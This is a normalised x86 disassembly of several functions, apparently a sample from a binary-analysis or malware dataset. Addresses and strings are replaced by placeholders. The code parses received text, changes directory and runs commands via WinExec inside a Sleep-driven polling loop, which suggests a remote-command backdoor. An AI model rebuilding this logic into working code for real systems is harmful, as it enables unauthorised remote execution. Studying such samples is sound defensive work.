sub_401000
push ebp
mov ebp esp
sub esp 0x18
mov [ ebp - 0x18 ] ecx
push 0xc800
call ??2@YAPAXI@Z
pop ecx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x18 ]
mov ecx [ ebp - 0x4 ]
mov [ eax + 0x8 ] ecx
push 0x19000
call ??2@YAPAXI@Z
pop ecx
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x18 ]
mov ecx [ ebp - 0x8 ]
mov [ eax + 0xc ] ecx
push 0x400
call ??2@YAPAXI@Z
pop ecx
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0x18 ]
mov ecx [ ebp - 0xc ]
mov [ eax + 0x10 ] ecx
push 0x400
call ??2@YAPAXI@Z
pop ecx
mov [ ebp - 0x10 ] eax
mov eax [ ebp - 0x18 ]
mov ecx [ ebp - 0x10 ]
mov [ eax + 0x14 ] ecx
push 0x400
call ??2@YAPAXI@Z
pop ecx
mov [ ebp - 0x14 ] eax
mov eax [ ebp - 0x18 ]
mov ecx [ ebp - 0x14 ]
mov [ eax + 0x50 ] ecx
mov eax [ ebp - 0x18 ]
and [ eax + 0x58 ] 0x0
mov eax [ ebp - 0x18 ]
mov [ eax + 0x54 ] 0x0
mov eax [ ebp - 0x18 ]
leave
retn
sub_40108f
push ebp
mov ebp esp
sub esp 0xf4
push esi
push edi
mov [ ebp - 0x24 ] ecx
push r--data
push [ ebp + 0x8 ]
call sub_401629
pop ecx
pop ecx
test eax eax
je r-xdata
mov [ ebp - 0x8 ] 0xbb8
push r--data
push [ ebp + 0x8 ]
call sub_401629
pop ecx
pop ecx
test eax eax
je r-xdata
push r--data
push [ ebp + 0x8 ]
call sub_401629
pop ecx
pop ecx
test eax eax
jne r-xdata
mov eax [ ebp - 0x24 ]
mov eax [ eax + 0x4 ]
mov eax [ eax + 0x60 ]
mov [ ebp - 0x8 ] eax
push r--data
push [ ebp + 0x8 ]
call sub_401629
pop ecx
pop ecx
mov [ ebp - 0x10 ] eax
mov eax [ ebp - 0x10 ]
add eax 0x4
push eax
call atoi
pop ecx
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x10 ]
mov [ eax ] 0x0
jmp r-xdata
mov eax [ ebp - 0x24 ]
mov eax [ eax + 0xc ]
dec eax
mov [ ebp - 0x28 ] eax
mov eax [ ebp - 0x80 ]
mov al [ eax ]
mov [ ebp - 0x85 ] al
inc [ ebp - 0x80 ]
cmp [ ebp - 0x85 ] 0x0
jne r-xdata
mov eax [ ebp - 0x80 ]
sub eax [ ebp - 0x84 ]
mov [ ebp - 0x8c ] eax
je r-xdata
push 0x104
call ??2@YAPAXI@Z
pop ecx
mov [ ebp - 0x1c ] eax
mov eax [ ebp - 0x1c ]
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x8 ]
mov [ ebp - 0x80 ] eax
mov eax [ ebp - 0x80 ]
inc eax
mov [ ebp - 0x84 ] eax
mov eax [ ebp - 0x28 ]
mov al [ eax + 0x1 ]
mov [ ebp - 0x29 ] al
inc [ ebp - 0x28 ]
cmp [ ebp - 0x29 ] 0x0
jne r-xdata
mov edi [ ebp - 0x28 ]
mov esi r--data
movsd [ edi ] [ esi ]
movsb [ edi ] [ esi ]
mov eax [ ebp + 0x8 ]
mov [ ebp - 0x30 ] eax
mov eax [ ebp - 0x30 ]
mov [ ebp - 0x34 ] eax
push r--data
push [ ebp - 0x4 ]
call sprintf
pop ecx
pop ecx
mov [ ebp - 0x90 ] r--data
mov eax [ ebp + 0x8 ]
mov [ ebp - 0x94 ] eax
mov eax [ ebp - 0x30 ]
mov al [ eax ]
mov [ ebp - 0x35 ] al
inc [ ebp - 0x30 ]
cmp [ ebp - 0x35 ] 0x0
jne r-xdata
mov eax [ ebp - 0x30 ]
sub eax [ ebp - 0x34 ]
mov ecx [ ebp - 0x34 ]
mov [ ebp - 0x3c ] ecx
mov [ ebp - 0x40 ] eax
mov eax [ ebp - 0x24 ]
mov eax [ eax + 0xc ]
dec eax
mov [ ebp - 0x44 ] eax
mov eax [ ebp - 0xa4 ]
mov al [ eax ]
mov [ ebp - 0xa9 ] al
inc [ ebp - 0xa4 ]
cmp [ ebp - 0xa9 ] 0x0
jne r-xdata
mov eax [ ebp - 0xa4 ]
sub eax [ ebp - 0xa8 ]
mov [ ebp - 0xb0 ] eax
mov eax [ ebp - 0xb0 ]
mov [ ebp - 0xc ] eax
cmp [ ebp - 0xc ] 0x0
jne r-xdata
sbb eax eax
sbb eax 0xffffffff
mov [ ebp - 0x9c ] eax
cmp [ ebp - 0x95 ] 0x0
je r-xdata
mov eax [ ebp - 0x44 ]
mov al [ eax + 0x1 ]
mov [ ebp - 0x45 ] al
inc [ ebp - 0x44 ]
cmp [ ebp - 0x45 ] 0x0
jne r-xdata
mov edi [ ebp - 0x44 ]
mov esi [ ebp - 0x3c ]
mov eax [ ebp - 0x40 ]
mov ecx eax
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
and ecx 0x3
[ edi ] [ esi ]
mov eax [ ebp - 0x24 ]
mov eax [ eax + 0xc ]
dec eax
mov [ ebp - 0x4c ] eax
mov eax [ ebp - 0x24 ]
mov eax [ eax + 0x8 ]
mov ecx [ ebp - 0xc ]
lea eax [ eax + ecx - 0x1 ]
mov [ ebp - 0x18 ] eax
mov eax [ ebp - 0x24 ]
mov eax [ eax + 0xc ]
dec eax
mov [ ebp - 0xb4 ] eax
push [ ebp + 0x8 ]
push r--data
push [ ebp - 0x4 ]
call sprintf
add esp 0xc
jmp r-xdata
and [ ebp - 0x9c ] 0x0
jmp r-xdata
mov eax [ ebp - 0x94 ]
mov al [ eax + 0x1 ]
mov [ ebp - 0x96 ] al
mov ecx [ ebp - 0x90 ]
cmp al [ ecx + 0x1 ]
jne r-xdata
mov eax [ ebp - 0x4c ]
mov al [ eax + 0x1 ]
mov [ ebp - 0x4d ] al
inc [ ebp - 0x4c ]
cmp [ ebp - 0x4d ] 0x0
jne r-xdata
mov edi [ ebp - 0x4c ]
mov esi r--data
movsd [ edi ] [ esi ]
movsw [ edi ] [ esi ]
movsb [ edi ] [ esi ]
mov eax [ ebp - 0x24 ]
mov eax [ eax + 0x10 ]
dec eax
mov [ ebp - 0x54 ] eax
mov eax [ ebp - 0x18 ]
mov [ ebp - 0xc4 ] eax
mov eax [ ebp - 0xc4 ]
inc eax
mov [ ebp - 0xc8 ] eax
mov eax [ ebp - 0x18 ]
movsx eax [ eax - 0x2 ]
cmp eax 0xd
jne r-xdata
mov eax [ ebp - 0xb4 ]
mov al [ eax + 0x1 ]
mov [ ebp - 0xb5 ] al
inc [ ebp - 0xb4 ]
cmp [ ebp - 0xb5 ] 0x0
jne r-xdata
mov edi [ ebp - 0xb4 ]
mov esi r--data
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov eax [ ebp - 0x24 ]
mov eax [ eax + 0x10 ]
dec eax
mov [ ebp - 0xbc ] eax
push [ ebp - 0x8 ]
push 0xc800
mov eax [ ebp - 0x24 ]
push [ eax + 0x8 ]
push [ ebp - 0x4 ]
mov ecx [ ebp - 0x24 ]
call sub_4032d0
mov eax [ ebp - 0x24 ]
mov eax [ eax + 0x8 ]
mov [ ebp - 0xa4 ] eax
mov eax [ ebp - 0xa4 ]
inc eax
mov [ ebp - 0xa8 ] eax
mov eax [ ebp - 0x9c ]
mov [ ebp - 0xa0 ] eax
cmp [ ebp - 0xa0 ] 0x0
je r-xdata
add [ ebp - 0x94 ] 0x2
add [ ebp - 0x90 ] 0x2
cmp [ ebp - 0x96 ] 0x0
jne r-xdata
mov eax [ ebp - 0x54 ]
mov al [ eax + 0x1 ]
mov [ ebp - 0x55 ] al
inc [ ebp - 0x54 ]
cmp [ ebp - 0x55 ] 0x0
jne r-xdata
mov edi [ ebp - 0x54 ]
mov esi r--data
movsd [ edi ] [ esi ]
movsb [ edi ] [ esi ]
mov eax [ ebp + 0x8 ]
mov [ ebp - 0x5c ] eax
mov eax [ ebp - 0x5c ]
mov [ ebp - 0x60 ] eax
mov eax [ ebp - 0xc4 ]
mov al [ eax ]
mov [ ebp - 0xc9 ] al
inc [ ebp - 0xc4 ]
cmp [ ebp - 0xc9 ] 0x0
jne r-xdata
mov eax [ ebp - 0xc4 ]
sub eax [ ebp - 0xc8 ]
mov [ ebp - 0xd0 ] eax
mov eax [ ebp - 0xd0 ]
mov [ ebp - 0x14 ] eax
cmp [ ebp - 0x14 ] 0x0
je r-xdata
mov eax [ ebp - 0x18 ]
dec eax
mov [ ebp - 0x18 ] eax
jmp r-xdata
mov eax [ ebp - 0x18 ]
movsx eax [ eax - 0x1 ]
cmp eax 0xa
jne r-xdata
mov eax [ ebp - 0xbc ]
mov al [ eax + 0x1 ]
mov [ ebp - 0xbd ] al
inc [ ebp - 0xbc ]
cmp [ ebp - 0xbd ] 0x0
jne r-xdata
mov edi [ ebp - 0xbc ]
mov esi r--data
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
jmp r-xdata
mov eax [ ebp - 0x94 ]
mov al [ eax ]
mov [ ebp - 0x95 ] al
mov ecx [ ebp - 0x90 ]
cmp al [ ecx ]
jne r-xdata
mov eax [ ebp - 0x5c ]
mov al [ eax ]
mov [ ebp - 0x61 ] al
inc [ ebp - 0x5c ]
cmp [ ebp - 0x61 ] 0x0
jne r-xdata
mov eax [ ebp - 0x5c ]
sub eax [ ebp - 0x60 ]
mov ecx [ ebp - 0x60 ]
mov [ ebp - 0x68 ] ecx
mov [ ebp - 0x6c ] eax
mov eax [ ebp - 0x24 ]
mov eax [ eax + 0x10 ]
dec eax
mov [ ebp - 0x70 ] eax
mov eax [ ebp - 0x24 ]
mov eax [ eax + 0x8 ]
mov [ ebp - 0xdc ] eax
mov eax [ ebp - 0xdc ]
mov [ ebp - 0xe0 ] eax
mov eax [ ebp - 0x18 ]
add eax [ ebp - 0x14 ]
movsx eax [ eax - 0x2 ]
cmp eax 0xd
jne r-xdata
mov eax [ ebp - 0x24 ]
mov ecx [ ebp - 0x18 ]
cmp ecx [ eax + 0x8 ]
jbe r-xdata
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov [ ebp - 0x20 ] eax
push [ ebp - 0x20 ]
call ??3@YAXPAX@Z
pop ecx
mov eax [ ebp - 0x70 ]
mov al [ eax + 0x1 ]
mov [ ebp - 0x71 ] al
inc [ ebp - 0x70 ]
cmp [ ebp - 0x71 ] 0x0
jne r-xdata
mov edi [ ebp - 0x70 ]
mov esi [ ebp - 0x68 ]
mov eax [ ebp - 0x6c ]
mov ecx eax
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
and ecx 0x3
[ edi ] [ esi ]
mov eax [ ebp - 0x24 ]
mov eax [ eax + 0x10 ]
dec eax
mov [ ebp - 0x78 ] eax
mov eax [ ebp - 0xdc ]
mov al [ eax ]
mov [ ebp - 0xe1 ] al
inc [ ebp - 0xdc ]
cmp [ ebp - 0xe1 ] 0x0
jne r-xdata
mov eax [ ebp - 0xdc ]
sub eax [ ebp - 0xe0 ]
mov ecx [ ebp - 0xe0 ]
mov [ ebp - 0xe8 ] ecx
mov [ ebp - 0xec ] eax
mov eax [ ebp - 0x24 ]
mov eax [ eax + 0xc ]
dec eax
mov [ ebp - 0xf0 ] eax
push [ ebp - 0x18 ]
call [ SetCurrentDirectoryA@IAT ]
mov eax [ ebp - 0x18 ]
dec eax
mov [ ebp - 0xd4 ] eax
mov eax [ ebp - 0x18 ]
add eax [ ebp - 0x14 ]
movsx eax [ eax - 0x1 ]
cmp eax 0xa
jne r-xdata
mov eax [ ebp - 0x78 ]
mov al [ eax + 0x1 ]
mov [ ebp - 0x79 ] al
inc [ ebp - 0x78 ]
cmp [ ebp - 0x79 ] 0x0
jne r-xdata
mov edi [ ebp - 0x78 ]
mov esi r--data
movsd [ edi ] [ esi ]
movsw [ edi ] [ esi ]
movsb [ edi ] [ esi ]
push 0x0
push [ ebp + 0x8 ]
call [ WinExec@IAT ]
jmp r-xdata
mov eax [ ebp - 0xf0 ]
mov al [ eax + 0x1 ]
mov [ ebp - 0xf1 ] al
inc [ ebp - 0xf0 ]
cmp [ ebp - 0xf1 ] 0x0
jne r-xdata
mov edi [ ebp - 0xf0 ]
mov esi [ ebp - 0xe8 ]
mov eax [ ebp - 0xec ]
mov ecx eax
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
and ecx 0x3
[ edi ] [ esi ]
mov eax [ ebp - 0xd4 ]
mov al [ eax + 0x1 ]
mov [ ebp - 0xd5 ] al
inc [ ebp - 0xd4 ]
cmp [ ebp - 0xd5 ] 0x0
jne r-xdata
mov edi [ ebp - 0xd4 ]
mov esi r--data
movsw [ edi ] [ esi ]
mov eax [ ebp - 0x18 ]
add eax [ ebp - 0x14 ]
mov [ eax - 0x2 ] 0x0
mov eax [ ebp - 0x18 ]
add eax [ ebp - 0x14 ]
mov [ eax - 0x1 ] 0x0
mov al 0x1
pop edi
pop esi
leave
retn 0x4
sub_40163b
push ebp
mov ebp esp
sub esp 0x2c
mov [ ebp - 0x4 ] ecx
mov eax [ ebp - 0x4 ]
mov ecx [ ebp + 0x8 ]
mov [ eax + 0x4 ] ecx
mov [ ebp - 0x8 ] r--data
mov eax [ ebp + 0xc ]
mov [ ebp - 0xc ] eax
sbb eax eax
sbb eax 0xffffffff
mov [ ebp - 0x14 ] eax
cmp [ ebp - 0xd ] 0x0
je r-xdata
mov [ ebp - 0x1c ] r--data
mov eax [ ebp + 0xc ]
mov [ ebp - 0x20 ] eax
push 0x2710
push 0x36ee80
push 0x0
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax + 0x4 ]
call sub_405a2e
jmp r-xdata
and [ ebp - 0x14 ] 0x0
jmp r-xdata
mov eax [ ebp - 0xc ]
mov al [ eax + 0x1 ]
mov [ ebp - 0xe ] al
mov ecx [ ebp - 0x8 ]
cmp al [ ecx + 0x1 ]
jne r-xdata
sbb eax eax
sbb eax 0xffffffff
mov [ ebp - 0x28 ] eax
cmp [ ebp - 0x21 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
mov ecx [ ebp - 0x4 ]
mov ecx [ ecx + 0x4 ]
mov eax [ eax ]
call [ eax + 0x18 ]
leave
retn 0x10
mov eax [ ebp - 0x14 ]
mov [ ebp - 0x18 ] eax
cmp [ ebp - 0x18 ] 0x0
jne r-xdata
add [ ebp - 0xc ] 0x2
add [ ebp - 0x8 ] 0x2
cmp [ ebp - 0xe ] 0x0
jne r-xdata
push 0x3e8
push 0x3e8
push 0x0
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax + 0x4 ]
call sub_405a2e
and [ ebp - 0x28 ] 0x0
jmp r-xdata
mov eax [ ebp - 0x20 ]
mov al [ eax + 0x1 ]
mov [ ebp - 0x22 ] al
mov ecx [ ebp - 0x1c ]
cmp al [ ecx + 0x1 ]
jne r-xdata
mov eax [ ebp - 0xc ]
mov al [ eax ]
mov [ ebp - 0xd ] al
mov ecx [ ebp - 0x8 ]
cmp al [ ecx ]
jne r-xdata
mov eax [ ebp - 0x28 ]
mov [ ebp - 0x2c ] eax
cmp [ ebp - 0x2c ] 0x0
jne r-xdata
add [ ebp - 0x20 ] 0x2
add [ ebp - 0x1c ] 0x2
cmp [ ebp - 0x22 ] 0x0
jne r-xdata
mov eax [ ebp - 0x20 ]
mov al [ eax ]
mov [ ebp - 0x21 ] al
mov ecx [ ebp - 0x1c ]
cmp al [ ecx ]
jne r-xdata
sub_401754
push ebp
mov ebp esp
sub esp 0x134
push esi
push edi
mov [ ebp - 0x78 ] ecx
push 0x104
call ??2@YAPAXI@Z
pop ecx
mov [ ebp - 0x60 ] eax
mov eax [ ebp - 0x60 ]
mov [ ebp - 0xc ] eax
push 0x104
call ??2@YAPAXI@Z
pop ecx
mov [ ebp - 0x64 ] eax
mov eax [ ebp - 0x64 ]
mov [ ebp - 0x1c ] eax
push 0x104
call ??2@YAPAXI@Z
pop ecx
mov [ ebp - 0x68 ] eax
mov eax [ ebp - 0x68 ]
mov [ ebp - 0x14 ] eax
push 0x104
call ??2@YAPAXI@Z
pop ecx
mov [ ebp - 0x6c ] eax
mov eax [ ebp - 0x6c ]
mov [ ebp - 0x18 ] eax
push 0x104
call ??2@YAPAXI@Z
pop ecx
mov [ ebp - 0x70 ] eax
mov eax [ ebp - 0x70 ]
mov [ ebp - 0x4 ] eax
push 0x32
call ??2@YAPAXI@Z
pop ecx
mov [ ebp - 0x74 ] eax
mov eax [ ebp - 0x74 ]
mov [ ebp - 0x10 ] eax
pop edi
pop esi
leave
retn
mov ecx [ ebp - 0x78 ]
call sub_401f3c
movzx eax al
test eax eax
jne r-xdata
mov eax [ ebp - 0x78 ]
mov eax [ eax + 0x4 ]
push [ eax + 0x5c ]
mov eax [ ebp - 0x78 ]
mov eax [ eax + 0x4 ]
mov ecx [ ebp - 0x78 ]
mov ecx [ ecx + 0x4 ]
mov eax [ eax ]
call [ eax + 0x34 ]
movzx eax al
test eax eax
jne r-xdata
push 0xea60
call [ Sleep@IAT ]
jmp r-xdata
mov eax [ ebp - 0x78 ]
mov eax [ eax + 0x4 ]
movzx eax [ eax + 0x9 ]
test eax eax
je r-xdata
push 0x64
call [ Sleep@IAT ]
xor eax eax
inc eax
je r-xdata
mov eax [ ebp - 0x78 ]
mov eax [ eax + 0x4 ]
mov ecx [ ebp - 0x78 ]
mov ecx [ ecx + 0x4 ]
mov eax [ eax ]
call [ eax + 0x1c ]
mov [ ebp - 0x8 ] eax
cmp [ ebp - 0x8 ] 0x0
jne r-xdata
call [ GetTickCount@IAT ]
xor edx edx
mov ecx 0x2710
div ecx
push edx
push r--data
call printf
pop ecx
pop ecx
mov eax [ ebp - 0x8 ]
mov [ ebp - 0x7c ] eax
mov eax [ ebp - 0x14 ]
mov [ ebp - 0x80 ] eax
mov eax [ ebp - 0x80 ]
mov [ ebp - 0x84 ] eax
and [ ebp - 0x14 ] 0x0
jmp r-xdata
mov eax [ ebp - 0x7c ]
mov al [ eax ]
mov [ ebp - 0x85 ] al
mov eax [ ebp - 0x80 ]
mov cl [ ebp - 0x85 ]
mov [ eax ] cl
mov eax [ ebp - 0x7c ]
inc eax
mov [ ebp - 0x7c ] eax
mov eax [ ebp - 0x80 ]
inc eax
mov [ ebp - 0x80 ] eax
cmp [ ebp - 0x85 ] 0x0
jne r-xdata
cmp [ ebp - 0x14 ] 0x0
jne r-xdata
mov eax [ ebp - 0x14 ]
mov [ ebp - 0x8c ] eax
mov eax [ ebp - 0x8c ]
inc eax
mov [ ebp - 0x90 ] eax
push r--data
call printf
pop ecx
push r--data
mov eax [ ebp - 0x78 ]
mov ecx [ eax + 0x4 ]
call sub_404f7a
mov eax [ ebp - 0x78 ]
mov edi [ eax + 0xc ]
mov esi r--data
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsb [ edi ] [ esi ]
mov eax [ ebp - 0x78 ]
mov edi [ eax + 0x10 ]
mov esi r--data
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsb [ edi ] [ esi ]
push 0x64
call [ Sleep@IAT ]
jmp r-xdata
mov eax [ ebp - 0x8c ]
mov al [ eax ]
mov [ ebp - 0x91 ] al
inc [ ebp - 0x8c ]
cmp [ ebp - 0x91 ] 0x0
jne r-xdata
mov eax [ ebp - 0x8c ]
sub eax [ ebp - 0x90 ]
mov [ ebp - 0x98 ] eax
mov eax [ ebp - 0x98 ]
mov [ ebp - 0x5c ] eax
cmp [ ebp - 0x5c ] 0x2
jle r-xdata
mov eax [ ebp - 0x78 ]
mov eax [ eax + 0x4 ]
mov eax [ eax + 0x5c ]
cdq
mov ecx 0x3e8
idiv ecx
push eax
push r--data
push [ ebp - 0x10 ]
call sprintf
add esp 0xc
lea eax [ ebp - 0x28 ]
push eax
call sub_401eff
pop ecx
mov eax [ ebp - 0x78 ]
mov ecx [ eax + 0x4 ]
mov eax [ ebp - 0x78 ]
mov eax [ eax + 0x4 ]
mov eax [ eax + 0x5c ]
cdq
mov esi 0x3e8
idiv esi
cdq
add eax [ ebp - 0x28 ]
mov esi [ ebp - 0x24 ]
adc esi edx
mov [ ebp - 0xa4 ] ecx
mov [ ebp - 0xac ] eax
mov [ ebp - 0xa8 ] esi
mov eax [ ebp - 0xa4 ]
mov eax [ eax + 0x6c ]
cmp eax [ ebp - 0xa8 ]
jl r-xdata
push [ ebp - 0x14 ]
push r--data
call printf
pop ecx
pop ecx
push r--data
mov eax [ ebp - 0x78 ]
mov ecx [ eax + 0x4 ]
call sub_404f7a
push [ ebp - 0x14 ]
mov eax [ ebp - 0x78 ]
mov ecx [ eax + 0x4 ]
call sub_404f7a
push r--data
mov eax [ ebp - 0x78 ]
mov ecx [ eax + 0x4 ]
call sub_404f7a
mov eax [ ebp - 0x78 ]
mov eax [ eax + 0x4 ]
movzx eax [ eax + 0x56 ]
test eax eax
jne r-xdata
mov eax [ ebp - 0x14 ]
add eax [ ebp - 0x5c ]
movsx eax [ eax - 0x2 ]
cmp eax 0xd
jne r-xdata
mov eax [ ebp - 0x78 ]
mov eax [ eax + 0x4 ]
mov eax [ eax + 0x5c ]
cdq
mov ecx 0x3e8
idiv ecx
cdq
add eax [ ebp - 0x28 ]
mov ecx [ ebp - 0x24 ]
adc ecx edx
mov [ ebp - 0xb4 ] eax
mov [ ebp - 0xb0 ] ecx
jg r-xdata
mov eax [ ebp - 0x14 ]
dec eax
mov [ ebp - 0x9c ] eax
jmp r-xdata
mov eax [ ebp - 0x14 ]
add eax [ ebp - 0x5c ]
movsx eax [ eax - 0x1 ]
cmp eax 0xa
jne r-xdata
mov eax [ ebp - 0xb8 ]
mov al [ eax + 0x1 ]
mov [ ebp - 0xb9 ] al
inc [ ebp - 0xb8 ]
cmp [ ebp - 0xb9 ] 0x0
jne r-xdata
mov edi [ ebp - 0xb8 ]
mov esi r--data
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov eax [ ebp - 0x4 ]
mov [ ebp - 0xc0 ] eax
mov eax [ ebp - 0xc0 ]
mov [ ebp - 0xc4 ] eax
mov eax [ ebp - 0x78 ]
mov eax [ eax + 0x4 ]
mov ecx [ eax + 0x68 ]
mov [ ebp - 0xb4 ] ecx
mov eax [ eax + 0x6c ]
mov [ ebp - 0xb0 ] eax
jmp r-xdata
mov eax [ ebp - 0xa4 ]
mov eax [ eax + 0x68 ]
cmp eax [ ebp - 0xac ]
jbe r-xdata
mov eax [ ebp - 0x9c ]
mov al [ eax + 0x1 ]
mov [ ebp - 0x9d ] al
inc [ ebp - 0x9c ]
cmp [ ebp - 0x9d ] 0x0
jne r-xdata
mov edi [ ebp - 0x9c ]
mov esi r--data
movsw [ edi ] [ esi ]
push 0x19000
push 0x0
mov eax [ ebp - 0x78 ]
push [ eax + 0xc ]
call memset
add esp 0xc
push 0x400
push 0x0
mov eax [ ebp - 0x78 ]
push [ eax + 0x10 ]
call memset
add esp 0xc
mov eax [ ebp - 0x14 ]
add eax [ ebp - 0x5c ]
mov [ eax - 0x2 ] 0x0
mov eax [ ebp - 0xc0 ]
mov al [ eax ]
mov [ ebp - 0xc5 ] al
inc [ ebp - 0xc0 ]
cmp [ ebp - 0xc5 ] 0x0
jne r-xdata
mov eax [ ebp - 0xc0 ]
sub eax [ ebp - 0xc4 ]
mov ecx [ ebp - 0xc4 ]
mov [ ebp - 0xcc ] ecx
mov [ ebp - 0xd0 ] eax
mov eax [ ebp - 0x78 ]
mov eax [ eax + 0x10 ]
dec eax
mov [ ebp - 0xd4 ] eax
mov eax [ ebp - 0xb4 ]
mov [ ebp - 0x58 ] eax
mov eax [ ebp - 0xb0 ]
mov [ ebp - 0x54 ] eax
lea eax [ ebp - 0x58 ]
push eax
lea eax [ ebp - 0x4c ]
push eax
call _localtime64_s
pop ecx
pop ecx
lea eax [ ebp - 0x4c ]
push eax
push 0x104
push [ ebp - 0x4 ]
call asctime_s
add esp 0xc
mov eax [ ebp - 0x78 ]
mov eax [ eax + 0x10 ]
dec eax
mov [ ebp - 0xb8 ] eax
push r--data
push [ ebp - 0x14 ]
call sub_401629
pop ecx
pop ecx
mov [ ebp - 0x20 ] eax
mov eax [ ebp - 0x20 ]
sub eax [ ebp - 0x14 ]
push eax
push [ ebp - 0x14 ]
push [ ebp - 0xc ]
call memcpy
add esp 0xc
mov eax [ ebp - 0x20 ]
sub eax [ ebp - 0x14 ]
mov ecx [ ebp - 0xc ]
mov [ ecx + eax ] 0x0
push [ ebp - 0xc ]
mov ecx [ ebp - 0x78 ]
call sub_40235f
mov eax [ ebp - 0x20 ]
inc eax
mov [ ebp - 0x14 ] eax
jmp r-xdata
mov eax [ ebp - 0xd4 ]
mov al [ eax + 0x1 ]
mov [ ebp - 0xd5 ] al
inc [ ebp - 0xd4 ]
cmp [ ebp - 0xd5 ] 0x0
jne r-xdata
mov edi [ ebp - 0xd4 ]
mov esi [ ebp - 0xcc ]
mov eax [ ebp - 0xd0 ]
mov ecx eax
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
and ecx 0x3
[ edi ] [ esi ]
mov eax [ ebp - 0x10 ]
mov [ ebp - 0xdc ] eax
mov eax [ ebp - 0xdc ]
mov [ ebp - 0xe0 ] eax
push r--data
push [ ebp - 0x14 ]
call sub_401629
pop ecx
pop ecx
test eax eax
je r-xdata
mov eax [ ebp - 0xdc ]
mov al [ eax ]
mov [ ebp - 0xe1 ] al
inc [ ebp - 0xdc ]
cmp [ ebp - 0xe1 ] 0x0
jne r-xdata
mov eax [ ebp - 0xdc ]
sub eax [ ebp - 0xe0 ]
mov ecx [ ebp - 0xe0 ]
mov [ ebp - 0xe8 ] ecx
mov [ ebp - 0xec ] eax
mov eax [ ebp - 0x78 ]
mov eax [ eax + 0x10 ]
dec eax
mov [ ebp - 0xf0 ] eax
mov eax [ ebp - 0xf0 ]
mov al [ eax + 0x1 ]
mov [ ebp - 0xf1 ] al
inc [ ebp - 0xf0 ]
cmp [ ebp - 0xf1 ] 0x0
jne r-xdata
mov edi [ ebp - 0xf0 ]
mov esi [ ebp - 0xe8 ]
mov eax [ ebp - 0xec ]
mov ecx eax
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
and ecx 0x3
[ edi ] [ esi ]
mov eax [ ebp - 0x78 ]
mov eax [ eax + 0x4 ]
movzx eax [ eax + 0x58 ]
test eax eax
jne r-xdata
mov eax [ ebp - 0x78 ]
push [ eax + 0x10 ]
mov eax [ ebp - 0x78 ]
mov eax [ eax + 0x4 ]
mov ecx [ ebp - 0x78 ]
mov ecx [ ecx + 0x4 ]
mov eax [ eax ]
call [ eax + 0x2c ]
mov eax [ ebp - 0x78 ]
push [ eax + 0xc ]
mov eax [ ebp - 0x78 ]
mov eax [ eax + 0x4 ]
mov ecx [ ebp - 0x78 ]
mov ecx [ ecx + 0x4 ]
mov eax [ eax ]
call [ eax + 0x28 ]
push r--data
mov eax [ ebp - 0x78 ]
mov ecx [ eax + 0x4 ]
call sub_404f7a
mov eax [ ebp - 0x78 ]
push [ eax + 0x10 ]
push r--data
call printf
pop ecx
pop ecx
mov eax [ ebp - 0x78 ]
mov eax [ eax + 0x4 ]
movzx eax [ eax + 0x9 ]
test eax eax
je r-xdata
mov eax [ ebp - 0x78 ]
mov eax [ eax + 0xc ]
dec eax
mov [ ebp - 0xf8 ] eax
mov eax [ ebp - 0x78 ]
mov eax [ eax + 0x4 ]
push [ eax + 0x5c ]
call [ Sleep@IAT ]
jmp r-xdata
call [ GetTickCount@IAT ]
xor edx edx
mov ecx 0x2710
div ecx
push edx
push r--data
call printf
pop ecx
pop ecx
mov eax [ ebp - 0xf8 ]
mov al [ eax + 0x1 ]
mov [ ebp - 0xf9 ] al
inc [ ebp - 0xf8 ]
cmp [ ebp - 0xf9 ] 0x0
jne r-xdata
mov edi [ ebp - 0xf8 ]
mov esi r--data
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov eax [ ebp - 0x4 ]
mov [ ebp - 0x100 ] eax
mov eax [ ebp - 0x100 ]
mov [ ebp - 0x104 ] eax
mov eax [ ebp - 0x100 ]
mov al [ eax ]
mov [ ebp - 0x105 ] al
inc [ ebp - 0x100 ]
cmp [ ebp - 0x105 ] 0x0
jne r-xdata
mov eax [ ebp - 0x100 ]
sub eax [ ebp - 0x104 ]
mov ecx [ ebp - 0x104 ]
mov [ ebp - 0x10c ] ecx
mov [ ebp - 0x110 ] eax
mov eax [ ebp - 0x78 ]
mov eax [ eax + 0xc ]
dec eax
mov [ ebp - 0x114 ] eax
mov eax [ ebp - 0x114 ]
mov al [ eax + 0x1 ]
mov [ ebp - 0x115 ] al
inc [ ebp - 0x114 ]
cmp [ ebp - 0x115 ] 0x0
jne r-xdata
mov edi [ ebp - 0x114 ]
mov esi [ ebp - 0x10c ]
mov eax [ ebp - 0x110 ]
mov ecx eax
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
and ecx 0x3
[ edi ] [ esi ]
mov eax [ ebp - 0x10 ]
mov [ ebp - 0x11c ] eax
mov eax [ ebp - 0x11c ]
mov [ ebp - 0x120 ] eax
mov eax [ ebp - 0x11c ]
mov al [ eax ]
mov [ ebp - 0x121 ] al
inc [ ebp - 0x11c ]
cmp [ ebp - 0x121 ] 0x0
jne r-xdata
mov eax [ ebp - 0x11c ]
sub eax [ ebp - 0x120 ]
mov ecx [ ebp - 0x120 ]
mov [ ebp - 0x128 ] ecx
